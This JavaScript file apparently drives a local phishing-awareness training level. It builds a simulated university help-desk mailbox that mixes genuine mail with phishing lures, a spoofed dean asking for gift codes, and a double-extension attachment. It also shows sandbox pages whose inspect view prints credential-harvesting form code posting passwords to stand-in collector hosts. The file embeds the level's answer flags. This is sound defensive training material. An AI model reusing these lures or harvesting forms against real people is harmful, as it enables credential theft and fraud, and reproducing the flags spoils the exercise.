/* Cyberity — The Handover Shift (level 305).
 * Local only. Fictional senders and domains; nothing sends, loads or leaves.
 *
 * Half this mailbox is genuine on purpose: the capstone is judgement, not
 * suspicion. Verdicts are only accepted for messages the student has opened,
 * and the counter reports HOW MANY are wrong, never WHICH — so the report
 * code cannot be reached by toggling.
 */

var Cyberity = (function () {
  function safe(fn) {
    try { if (typeof AndroidLab !== 'undefined') fn(); } catch (e) { /* preview */ }
  }
  return {
    clueFound: function (id) { safe(function () { AndroidLab.notifyClueFound(id); }); },
    flagDiscovered: function (token) { safe(function () { AndroidLab.notifyFlagDiscovered(token); }); }
  };
})();

/* Opened messages and verdicts survive page moves within the simulation. */
var Store = {
  read: function () {
    var raw = null;
    try { raw = window.sessionStorage.getItem('phish_sim'); } catch (e) { raw = null; }
    if (raw === null) {
      var tag = 'phish_sim=';
      raw = window.name.indexOf(tag) === 0 ? window.name.substring(tag.length) : '';
    }
    var state = { opened: {}, verdict: {} };
    (raw || '').split(';').forEach(function (part) {
      if (!part) return;
      var bits = part.split(':');
      if (bits[0] === 'o') state.opened[bits[1]] = true;
      if (bits[0] === 'v') state.verdict[bits[1]] = bits[2];
    });
    return state;
  },
  write: function (state) {
    var parts = [];
    Object.keys(state.opened).forEach(function (k) { parts.push('o:' + k); });
    Object.keys(state.verdict).forEach(function (k) { parts.push('v:' + k + ':' + state.verdict[k]); });
    var raw = parts.join(';');
    try { window.sessionStorage.setItem('phish_sim', raw); } catch (e) { /* ignored */ }
    window.name = 'phish_sim=' + raw;
  },
  open: function (id) {
    var s = Store.read();
    s.opened[id] = true;
    Store.write(s);
  },
  setVerdict: function (id, v) {
    var s = Store.read();
    if (!s.opened[id]) return false;
    s.verdict[id] = v;
    Store.write(s);
    return true;
  }
};

function escapeHtml(text) {
  return String(text)
    .replace(/&/g, '&amp;').replace(/</g, '&lt;')
    .replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

/* ---------------------------------------------------------------------------
 * The shared mailbox
 *
 * truth: 'genuine' | 'phishing'   — four of each, deliberately.
 * ------------------------------------------------------------------------ */
var MAIL = {
  m1: {
    id: 'm1', truth: 'genuine',
    from: 'CvSU Office of the Registrar',
    address: 'registrar@cvsu.edu.ph',
    to: 'helpdesk@cvsu.edu.ph',
    time: 'Today 07:12',
    subject: 'ENROLLMENT SLOT CONFIRMED - CONFIRM BEFORE 11:59PM TONIGHT',
    body: [
      'Good day.',
      'Your enrollment slot for the 2nd semester has been CONFIRMED. You must confirm ' +
        'your subjects in the student portal BEFORE 11:59PM TONIGHT or the slot will be ' +
        'released to the waitlist automatically.',
      'This is the final batch for this semester. No extensions.',
      'Office of the Registrar'
    ],
    link: {
      label: 'Confirm my subjects',
      shown: 'portal.cvsu.edu.ph',
      real: 'https://portal.cvsu.edu.ph/enrollment/confirm',
      owner: 'cvsu.edu.ph',
      note: 'The university’s own portal — the same address you already use to ' +
        'enrol. Nothing is being asked for that the registrar would not normally receive.',
      good: true
    },
    clue: 'opened_m1',
    linkClue: 'link_checked_m1'
  },

  m2: {
    id: 'm2', truth: 'phishing',
    from: 'Microsoft 365',
    address: 'no-reply@cvsu-edu-ph.m365-renew.example',
    to: 'helpdesk@cvsu.edu.ph',
    time: 'Today 08:40',
    subject: 'Action required: your password expires today',
    body: [
      'Dear user,',
      'Your CvSU Microsoft 365 password expires in 4 hours. To avoid losing access to ' +
        'mail and OneDrive, keep your current password using the button below.',
      'Microsoft 365 Account Team'
    ],
    link: {
      label: 'Keep my current password',
      shown: 'cvsu.edu.ph account portal',
      real: 'https://cvsu-edu-ph.m365-renew.example/keep',
      owner: 'm365-renew.example',
      note: '"cvsu-edu-ph" is a label in front of the real domain, joined by hyphens ' +
        'instead of dots. The owner is whoever registered m365-renew.example — ' +
        'eight days ago.',
      site: 'm365'
    },
    clue: 'opened_m2',
    linkClue: 'link_checked_m2'
  },

  m3: {
    id: 'm3', truth: 'genuine',
    from: 'DOST-SEI Scholarship Office',
    address: 'scholarships@sei.dost.gov.ph',
    to: 'helpdesk@cvsu.edu.ph',
    time: 'Today 08:58',
    subject: 'Reminder: annual requirements for continuing scholars',
    body: [
      'Good day.',
      'This is a reminder that continuing scholars must submit their grades and ' +
        'certificate of registration for the 2nd semester through your campus ' +
        'coordinator, as in previous semesters.',
      'No reply to this message is needed. Coordinators have the full checklist.',
      'DOST-SEI Scholarship Division'
    ],
    attachment: {
      name: 'requirements_checklist.pdf', type: 'PDF document', size: '148 KB',
      note: 'A genuine PDF. One extension, and it is a document format — not a ' +
        'program pretending to be one.',
      good: true
    },
    clue: 'opened_m3'
  },

  m4: {
    id: 'm4', truth: 'phishing',
    from: 'Dean R. Ramirez',
    address: 'r.ramirez@cvsu.edu.ph',
    to: 'helpdesk@cvsu.edu.ph',
    time: 'Today 09:15',
    subject: 'Quick favor - are you at your desk?',
    body: [
      'Are you around? I am in a meeting and cannot take calls.',
      'I need you to buy ₱8,000 of load for the accreditation visitors and send me ' +
        'the codes here. I will reimburse you this afternoon through the office.',
      'Please keep this between us for now, the budget line is not released yet. Send ' +
        'the codes as soon as you have them.',
      'Sent from my iPhone'
    ],
    headers: [
      ['From', 'Dean R. Ramirez <r.ramirez@cvsu.edu.ph>'],
      ['Reply-To', 'deanramirez.office2026@gmail.example'],
      ['Return-Path', 'bounce@mailer-44.sendgroup.example'],
      ['Authentication-Results', 'spf=fail dmarc=fail (cvsu.edu.ph)'],
      ['X-Originating-IP', '45.61.87.200']
    ],
    headerHot: [1, 2, 3, 4],
    canReply: true,
    clue: 'opened_m4',
    headerClue: 'reply_to_shown_m4'
  },

  m5: {
    id: 'm5', truth: 'genuine',
    from: 'CvSU IT Services Office',
    address: 'itso@cvsu.edu.ph',
    to: 'all-staff@cvsu.edu.ph',
    time: 'Today 09:32',
    subject: 'Scheduled maintenance: student portal, Saturday 01:00-04:00',
    body: [
      'Good day.',
      'The student portal will be unavailable this Saturday from 01:00 to 04:00 for ' +
        'scheduled maintenance. No action is required from you and no credentials will ' +
        'be requested at any point.',
      'If you need help during the window, contact the help desk at the usual extension.',
      'ITSO'
    ],
    clue: 'opened_m5'
  },

  m6: {
    id: 'm6', truth: 'phishing',
    from: 'OneDrive',
    address: 'share-noreply@onedrive-docs.example',
    to: 'helpdesk@cvsu.edu.ph',
    time: 'Today 10:04',
    subject: 'A document has been shared with you: THESIS_FINAL_revisions.docx',
    body: [
      'A. Mendoza shared a document with you.',
      'THESIS_FINAL_revisions.docx · Modified 12 minutes ago',
      'Sign in with your school account to view the revisions.'
    ],
    link: {
      label: 'Open the document',
      shown: 'onedrive.live.com',
      real: 'https://onedrive-docs.example/share/auth?id=8841',
      owner: 'onedrive-docs.example',
      note: 'Registered nine days ago, and nothing to do with the real service. The ' +
        'name in the blue text is only a label.',
      site: 'onedrive'
    },
    clue: 'opened_m6'
  },

  m7: {
    id: 'm7', truth: 'genuine',
    from: 'CvSU Library',
    address: 'library@cvsu.edu.ph',
    to: 'helpdesk@cvsu.edu.ph',
    time: 'Today 10:47',
    subject: 'Overdue notice: 1 item',
    body: [
      'Good day.',
      'Our records show one overdue item: "Computer Networks: A Top-Down Approach", ' +
        'due 18 September. Please return it at the circulation desk.',
      'Fines are settled at the counter, in person, as always.',
      'CvSU Library'
    ],
    clue: 'opened_m7'
  },

  m8: {
    id: 'm8', truth: 'phishing',
    from: 'Mail Administrator',
    address: 'postmaster@mail-quota-support.example',
    to: 'helpdesk@cvsu.edu.ph',
    time: 'Today 11:20',
    subject: 'FINAL WARNING: your mailbox will be deleted within 24 hours',
    body: [
      'Your mailbox has exceeded its storage quota of 2GB.',
      'All incoming mail is being rejected and your mailbox is scheduled for DELETION ' +
        'within 24 hours. Open the attached form and complete it immediately to restore ' +
        'your quota.',
      'Mail Administrator'
    ],
    attachment: {
      name: 'quota_restore_form.pdf.html', type: 'Web page', size: '44 KB',
      note: 'Two extensions. The last one wins, so this is a web page dressed as a PDF — ' +
        'it opens a sign-in form in your browser, it does not open a document.',
      dangerous: true
    },
    clue: 'opened_m8'
  }
};

var ORDER = ['m1', 'm2', 'm3', 'm4', 'm5', 'm6', 'm7', 'm8'];

/* ---------------------------------------------------------------------------
 * Mailbox list
 * ------------------------------------------------------------------------ */

/* ---------------------------------------------------------------------------
 * Returning to the list
 *
 * Shared block: identical in every simulation apart from KEY.
 *
 * Opening an item is a full page load, so coming back drops the student at the
 * top of the list and they have to hunt for their place again. Remember which
 * item was opened and put it back under their eyes instead.
 *
 * sessionStorage only, deliberately: this is a convenience, not state the
 * level depends on, so if the WebView refuses it the list simply behaves as
 * it did before.
 * ------------------------------------------------------------------------ */
var ReturnTo = {
  KEY: 'phish_sim_last',
  remember: function (id) {
    if (!id) return;
    try { window.sessionStorage.setItem(ReturnTo.KEY, id); } catch (e) { /* ignored */ }
  },
  restore: function () {
    var id = null;
    try { id = window.sessionStorage.getItem(ReturnTo.KEY); } catch (e) { id = null; }
    if (!id) return;
    var row = document.getElementById('card-' + id) ||
      document.querySelector('[href$="#' + id + '"]');
    // Jumped, not smoothed: an animated scroll on arrival reads as the page
    // sliding away by itself.
    if (row) row.scrollIntoView({ block: 'center' });
  }
};

function renderInbox(mountId, opts) {
  var state = Store.read();

  var html = ORDER.map(function (id) {
    var m = MAIL[id];
    var opened = !!state.opened[id];
    var v = state.verdict[id];

    var buttons = opened
      ? '<span class="verdict-row">' +
          '<button class="verdict-btn' + (v === 'genuine' ? ' picked-genuine' : '') + '" ' +
            'onclick="mark(event, \'' + id + '\', \'genuine\')">GENUINE</button>' +
          '<button class="verdict-btn' + (v === 'phishing' ? ' picked-phishing' : '') + '" ' +
            'onclick="mark(event, \'' + id + '\', \'phishing\')">PHISHING</button>' +
        '</span>'
      : '<span class="verdict-row"><span class="verdict-locked">' +
          'Open it before you can judge it</span></span>';

    return '' +
      '<div class="choice mail-choice ' + (opened ? 'read' : 'unread') +
        '" id="card-' + id + '">' +
        '<span class="mail-choice-body">' +
          '<a class="mail-choice-link" href="message.html#' + id + '">' +
            '<span class="sms-top">' +
              '<span class="sms-name">' + escapeHtml(m.from) + '</span>' +
              '<span class="sms-when">' + escapeHtml(m.time) + '</span>' +
            '</span>' +
            '<span class="sms-sub mono">' + escapeHtml(m.address) + '</span>' +
            '<span class="mail-choice-subject">' + escapeHtml(m.subject) + '</span>' +
            '<span class="mail-badge">' + (opened ? 'READ' : 'NOT READ YET') + '</span>' +
          '</a>' +
          buttons +
        '</span>' +
      '</div>';
  }).join('');

  document.getElementById(mountId).innerHTML = html;
  updateTriage();

  if (opts && typeof opts.keepScroll === 'number') {
    // Re-render after a verdict: hold the page exactly still.
    window.scrollTo(0, opts.keepScroll);
  } else {
    ReturnTo.restore();
  }
}


/** Records a verdict. Only the count of mismatches is ever revealed. */
function mark(event, id, verdict) {
  if (event) { event.preventDefault(); event.stopPropagation(); }
  if (!Store.setVerdict(id, verdict)) return;
  renderInbox('mail', { keepScroll: window.scrollY || window.pageYOffset || 0 });
}

function updateTriage() {
  var state = Store.read();
  var decided = 0;
  var wrong = 0;
  ORDER.forEach(function (id) {
    var v = state.verdict[id];
    if (!v) return;
    decided++;
    if (v !== MAIL[id].truth) wrong++;
  });

  var el = document.getElementById('triage-status');
  var banner = document.getElementById('report-banner');
  if (!el) return;

  if (decided < ORDER.length) {
    el.textContent = decided + ' of 8 judged';
    el.className = 'unread-line';
    if (banner) { banner.className = 'banner'; banner.innerHTML = ''; }
    return;
  }

  if (wrong > 0) {
    el.textContent = 'All 8 judged · ' + wrong +
      (wrong === 1 ? ' does not match the evidence' : ' do not match the evidence');
    el.className = 'unread-line warn-line';
    if (banner) { banner.className = 'banner'; banner.innerHTML = ''; }
    return;
  }

  el.textContent = 'All 8 judged · every verdict matches the evidence';
  el.className = 'unread-line good-line';
  if (banner) {
    banner.className = 'banner show good';
    banner.innerHTML = 'Shift report filed — four real, four fake. Report code: ' +
      '<b class="mono">CYBERITY{f0ur_r34l_f0ur_f4k3}</b>';
  }
  Cyberity.clueFound('all_eight_triaged');
  Cyberity.flagDiscovered('shift_report');
}

/* ---------------------------------------------------------------------------
 * A single message
 * ------------------------------------------------------------------------ */
function renderMessage(mountId) {
  ReturnTo.remember((window.location.hash || '').substring(1));
  var id = (window.location.hash || '#m1').substring(1);
  var m = MAIL[id] || MAIL.m1;
  window.CURRENT = m;

  Store.open(m.id);
  if (m.clue) Cyberity.clueFound(m.clue);

  var body = m.body.map(function (p) {
    return '<p>' + escapeHtml(p) + '</p>';
  }).join('');

  var link = '';
  if (m.link) {
    link =
      '<button class="mail-link" onclick="revealLink()">' + escapeHtml(m.link.label) + '</button>' +
      '<div class="reveal-slot" id="link-target"></div>';
  }

  var attachment = '';
  if (m.attachment) {
    attachment =
      '<div class="attachment" onclick="openAttachment()">' +
        '<span class="att-icon">FILE</span>' +
        '<span class="att-meta">' +
          '<span class="att-name mono">' + escapeHtml(m.attachment.name) + '</span>' +
          '<span class="small">' + escapeHtml(m.attachment.type) + ' · ' +
            escapeHtml(m.attachment.size) + ' · tap to inspect</span>' +
        '</span>' +
      '</div>' +
      '<div class="reveal-slot" id="att-target"></div>';
  }

  var headers = m.headers
    ? '<button class="cta ghost" onclick="showHeaders()">SHOW FULL HEADERS</button>' +
      '<div id="header-box"></div>'
    : '';

  // Only the message with no link carries a reply trap — replying is the
  // attacker's entire hook there.
  var reply = m.canReply
    ? '<div class="reply-bar">' +
        '<span class="reply-box">Reply to ' + escapeHtml(m.from) + '\u2026</span>' +
        '<button class="reply-send" onclick="replyToSender()">SEND</button>' +
      '</div>'
    : '';

  document.getElementById(mountId).innerHTML =
    '<div class="artifact a-msg">' +
      '<span class="artifact-tag">EMAIL</span>' +
      '<h2>' + escapeHtml(m.subject) + '</h2>' +
      '<div class="mail-field"><span class="mail-label">From</span>' +
        '<span class="mail-box"><b>' + escapeHtml(m.from) + '</b><br>' +
        '<span class="mono">' + escapeHtml(m.address) + '</span></span></div>' +
      '<div class="mail-field"><span class="mail-label">To</span>' +
        '<span class="mail-box mono">' + escapeHtml(m.to) + '</span></div>' +
      '<div class="mail-field"><span class="mail-label">Sent</span>' +
        '<span class="mail-box">' + escapeHtml(m.time) + '</span></div>' +
      '<div class="mail-body">' + body + link + attachment + '</div>' +
    '</div>' +
    headers +
    reply +
    '<div class="banner" id="msg-banner"></div>' +
    '<div class="appui"><b>Back to the mailbox</b>Every message can be marked GENUINE or ' +
      'PHISHING on its card once you have opened it.</div>' +
    '<a class="cta" href="inbox.html">RETURN TO THE MAILBOX</a>';

  var title = document.getElementById('msg-title');
  if (title) title.textContent = m.id.toUpperCase() + ' · ' + m.from;
  window.scrollTo(0, 0);
}

/** Reveals a link's true destination — never follows it. */
function revealLink() {
  var m = window.CURRENT;
  var box = document.getElementById('link-target');
  if (!m.link || box.classList.contains('open')) return;

  box.className = 'reveal-slot open';
  box.innerHTML =
    '<div class="artifact a-sys">' +
      '<span class="artifact-tag">WHERE THIS LINK GOES</span>' +
      '<div class="rows mono">' +
        'shown : ' + escapeHtml(m.link.shown) + '\n' +
        'real  : <span class="' + (m.link.good ? 'ok' : 'hot') + '">' +
          escapeHtml(m.link.real) + '</span>\n' +
        'owner : <span class="' + (m.link.good ? 'ok' : 'hot') + '">' +
          escapeHtml(m.link.owner) + '</span>' +
      '</div>' +
      '<div class="note">' + escapeHtml(m.link.note) + '</div>' +
    '</div>' +
    (m.link.site
      ? '<a class="cta" href="site.html#' + m.link.site + '">OPEN THIS PAGE IN THE SANDBOX</a>'
      : '<div class="appui">This one lands on the service’s own address, so there is ' +
        'nothing to open in the sandbox.</div>');

  if (m.linkClue) Cyberity.clueFound(m.linkClue);
  box.scrollIntoView({ behavior: 'smooth', block: 'center' });
}

/** Inspecting an attachment is safe. Running the double-extension one is not. */
function openAttachment() {
  var m = window.CURRENT;
  var box = document.getElementById('att-target');
  if (!m.attachment || box.classList.contains('open')) return;

  box.className = 'reveal-slot open';
  box.innerHTML =
    '<div class="artifact a-sys">' +
      '<span class="artifact-tag">FILE DETAILS</span>' +
      '<div class="rows mono">' +
        'name : ' + escapeHtml(m.attachment.name) + '\n' +
        'type : <span class="' + (m.attachment.good ? 'ok' : 'hot') + '">' +
          escapeHtml(m.attachment.type) + '</span>' +
      '</div>' +
      '<div class="note">' + escapeHtml(m.attachment.note) + '</div>' +
    '</div>' +
    (m.attachment.dangerous
      ? '<button class="cta danger" onclick="runAttachment()">OPEN THE FORM ANYWAY</button>'
      : '');
  box.scrollIntoView({ behavior: 'smooth', block: 'center' });
}

/** Dangerous: opening the .pdf.html attachment. */
function runAttachment() {
  var banner = document.getElementById('msg-banner');
  banner.className = 'banner show bad';
  banner.textContent = 'Blocked by the simulation. The file ends in .html, so it is a web ' +
    'page, not a document — it opens a sign-in form in your browser and sends whatever you ' +
    'type to whoever built it. A mail administrator does not restore quota through an ' +
    'attached form.';
  banner.scrollIntoView({ behavior: 'smooth', block: 'center' });
  Cyberity.clueFound('attachment_opened');
}

/** Dangerous: answering the impersonated dean instead of verifying. */
function replyToSender() {
  var banner = document.getElementById('msg-banner');
  banner.className = 'banner show bad';
  banner.textContent = 'Blocked by the simulation. Your reply would not reach the Dean \u2014 ' +
    'Reply-To sends it to a free webmail account the sender controls, and answering at all ' +
    'tells them the mailbox is staffed and willing. Verify through a channel you already ' +
    'had: the directory number, or the office itself.';
  banner.scrollIntoView({ behavior: 'smooth', block: 'center' });
  Cyberity.clueFound('replied_to_bec');
}

function showHeaders() {
  var m = window.CURRENT;
  var box = document.getElementById('header-box');
  if (!m.headers || box.innerHTML) return;

  var rows = m.headers.map(function (h, i) {
    var line = h[0] + ': ' + h[1];
    return (m.headerHot && m.headerHot.indexOf(i) !== -1)
      ? '<span class="hot">' + escapeHtml(line) + '</span>'
      : escapeHtml(line);
  }).join('\n');

  box.innerHTML =
    '<div class="artifact a-sys">' +
      '<span class="artifact-tag">MESSAGE HEADERS</span>' +
      '<div class="rows mono">' + rows + '</div>' +
      '<div class="note">The From line is typed by the sender. Reply-To is where an answer ' +
        'actually lands, and SPF and DMARC say whether the sending server was allowed to ' +
        'use that domain at all.</div>' +
    '</div>';
  if (m.headerClue) Cyberity.clueFound(m.headerClue);
  box.scrollIntoView({ behavior: 'smooth', block: 'start' });
}

/* ---------------------------------------------------------------------------
 * Sandbox pages
 * ------------------------------------------------------------------------ */
var SITES = {
  m365: {
    back: 'm2',
    url: 'https://cvsu-edu-ph.m365-renew.example/keep',
    owner: 'm365-renew.example',
    ownerNote: 'Registered 8 days ago. Nothing to do with Microsoft or the university.',
    clue: 'payload_page_opened_m2',
    brand: 'Microsoft 365',
    accent: '#0F6CBD',
    title: 'Keep your current password',
    note: 'cvsu.edu.ph · session expires in 03:52',
    fields: [
      { label: 'Email', type: 'email', placeholder: 'name@cvsu.edu.ph' },
      { label: 'Current password', type: 'password', placeholder: '••••••••' }
    ],
    button: 'Keep password',
    warning: 'Blocked by the simulation. This page asks for the password it claims to be ' +
      'saving. Password expiry is handled inside the account settings you reach yourself — ' +
      'never through a link in the warning.',
    inspect: [
      '&lt;form method="POST"',
      '<span class="hot">      action="https://collect.m365-renew.example/p.php"&gt;</span>',
      '  &lt;input name="user"&gt;   &lt;input name="pass"&gt;',
      '<span class="warn">  &lt;input type="hidden" name="next" value="https://login.microsoftonline.com"&gt;</span>',
      '&lt;/form&gt;'
    ],
    inspectNote: 'After it takes the password the page forwards you to the real sign-in ' +
      'screen, so the theft looks like a page that simply failed.'
  },
  onedrive: {
    back: 'm6',
    url: 'https://onedrive-docs.example/share/auth?id=8841',
    owner: 'onedrive-docs.example',
    ownerNote: 'Registered 9 days ago. The real service is not part of this domain.',
    clue: 'payload_page_opened',
    brand: 'OneDrive · Shared with you',
    accent: '#0364B8',
    title: 'THESIS_FINAL_revisions.docx',
    note: 'Sign in with your school account to view this document',
    fields: [
      { label: 'School email', type: 'email', placeholder: 'name@cvsu.edu.ph' },
      { label: 'Password', type: 'password', placeholder: '••••••••' }
    ],
    button: 'Sign in and open',
    warning: 'Blocked by the simulation. There is no document behind this page — the ' +
      'file name is the bait. Open shared files from the app or site you already use, not ' +
      'from the link in the notification.',
    inspect: [
      '&lt;form method="POST"',
      '<span class="hot">      action="https://collect.onedrive-docs.example/h.php"&gt;</span>',
      '  &lt;input name="email"&gt;  &lt;input name="password"&gt;',
      '<span class="hot">  &lt;input type="hidden" name="kit" value="CYBERITY{sh4r3d_w1th_n0_0n3}"&gt;</span>',
      '<span class="warn">  &lt;input type="hidden" name="next" value="https://onedrive.live.com"&gt;</span>',
      '&lt;/form&gt;'
    ],
    inspectNote: 'The kit field is the campaign marking its author left in place; the next ' +
      'field forwards you to the real service once your password has been taken.',
    inspectClue: 'payload_page_inspected'
  }
};

function renderSite(mountId) {
  var key = (window.location.hash || '#onedrive').substring(1);
  var site = SITES[key] || SITES.onedrive;
  window.currentSite = key;

  if (site.clue) Cyberity.clueFound(site.clue);

  var fields = site.fields.map(function (f) {
    return '<label class="fake-label">' + escapeHtml(f.label) + '</label>' +
      '<input class="fake-input" type="' + f.type + '" placeholder="' +
      escapeHtml(f.placeholder) + '" autocomplete="off">';
  }).join('');

  document.getElementById(mountId).innerHTML =
    '<div class="url-bar">' +
      '<div class="url-label">Address of the page you are on</div>' +
      '<div class="mono url-text">' + escapeHtml(site.url) + '</div>' +
      '<div class="url-note">Site owner: <b>' + escapeHtml(site.owner) + '</b><br>' +
        escapeHtml(site.ownerNote) + '</div>' +
    '</div>' +
    '<div class="artifact a-web">' +
      '<span class="artifact-tag">WEB PAGE &middot; SANDBOX</span>' +
      '<div class="fake-page">' +
        '<div class="fake-bar" style="background:' + site.accent + ';color:#ffffff">' +
          escapeHtml(site.brand) + '</div>' +
        '<div class="fake-inner">' +
          '<div class="fake-head">' + escapeHtml(site.title) + '</div>' +
          '<div class="fake-title">' + escapeHtml(site.note) + '</div>' +
          fields +
          '<button class="fake-btn" style="background:' + site.accent + '" ' +
            'onclick="signIn()">' + escapeHtml(site.button) + '</button>' +
        '</div>' +
      '</div>' +
    '</div>' +
    '<div class="banner" id="site-banner"></div>' +
    '<button class="cta" onclick="inspectSite()">INSPECT PAGE</button>' +
    '<div class="evidence" id="site-source"></div>' +
    '<div class="appui"><b>Opening a link is safe here</b>On your own account it is not. ' +
      'Reach a service through the address you type yourself or the app you installed.</div>';

  var back = document.getElementById('back-link');
  if (back) back.setAttribute('onclick', "location.href='message.html#" + site.back + "'");
  var owner = document.getElementById('site-owner');
  if (owner) owner.textContent = site.owner;
}

/** Dangerous: typing a password into one of these pages. */
function signIn() {
  var site = SITES[window.currentSite] || SITES.onedrive;
  var banner = document.getElementById('site-banner');
  banner.className = 'banner show bad';
  banner.textContent = site.warning;
  banner.scrollIntoView({ behavior: 'smooth', block: 'center' });
  Cyberity.clueFound('credentials_submitted');
}

function inspectSite() {
  var site = SITES[window.currentSite] || SITES.onedrive;
  var box = document.getElementById('site-source');
  if (box.classList.contains('open')) return;

  box.className = 'evidence open';
  box.innerHTML =
    '<div class="artifact a-sys">' +
      '<span class="artifact-tag">PAGE CODE &middot; SIGN-IN FORM</span>' +
      '<div class="rows">' + site.inspect.join('\n') + '</div>' +
      '<div class="note">' + escapeHtml(site.inspectNote) + '</div>' +
    '</div>';
  box.scrollIntoView({ behavior: 'smooth', block: 'start' });
  if (site.inspectClue) {
    Cyberity.clueFound(site.inspectClue);
    Cyberity.flagDiscovered('sign_in_form');
  }
}
